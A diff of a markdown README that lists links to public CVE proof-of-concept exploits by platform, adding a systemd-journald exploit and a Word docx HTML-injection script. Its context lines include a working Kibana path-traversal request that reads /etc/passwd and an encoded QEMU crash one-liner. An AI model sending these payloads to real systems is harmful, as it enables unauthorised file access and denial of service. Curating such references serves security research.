@@ -32,7 +32,8 @@ Some CVEs PoCs repos on github or internet.
 - [This repo records all the vulnerabilities of linux software I have reproduced in my local workspace](https://github.com/VulnReproduction/LinuxFlaw)
 - [linux-kernel-exploitation](https://github.com/xairy/linux-kernel-exploitation): A bunch of links related to Linux kernel exploitation
 - [Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration](https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/)
-
+- [System Down](https://www.qualys.com/2019/01/09/system-down/system-down.txt): A systemd-journald exploit. Combined Exploitation of CVE-2018-16865 and CVE-2018-16866
+  
 ## Solaris
 
 - Kernel Level Privilege Escalation in Oracle Solaris: [CVE-2018-2892](https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2018-2892---Kernel-Level-Privilege-Escalation-in-Oracle-Solaris/)
@@ -58,6 +59,7 @@ Some CVEs PoCs repos on github or internet.
 - Device Guard/CLM bypass using MSFT_ScriptResource: [CVE-2018–8212](https://posts.specterops.io/cve-2018-8212-device-guard-clm-bypass-using-msft-scriptresource-b6cc2318e885)
 - [A PoC function to corrupt the g_amsiContext global variable in clr.dll in .NET Framework Early Access build 3694](https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9)
 - [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits): windows-kernel-exploits Windows平台提权漏洞集合
+- [docx-embeddedhtml-injection](https://github.com/thom-s/docx-embeddedhtml-injection): This PowerShell script exploits a known vulnerability in Word 2016 documents with embedded online videos by injecting HTML code into a docx file, replacing the values of all pre-existing embeddedHtml tags.
 
 ## macOS/iOS
 
@@ -149,10 +151,10 @@ Some CVEs PoCs repos on github or internet.
 $ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
 '''
 
-*  Elasticsearch Kibana Console [CVE-2018-17246](https://twitter.com/IM_23pds/status/1074627634150006784) PoC：
+- Elasticsearch Kibana Console [CVE-2018-17246](https://twitter.com/IM_23pds/status/1074627634150006784) PoC：
 
 ```bash
-GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd 
+GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
 ```
 
 ## Additions
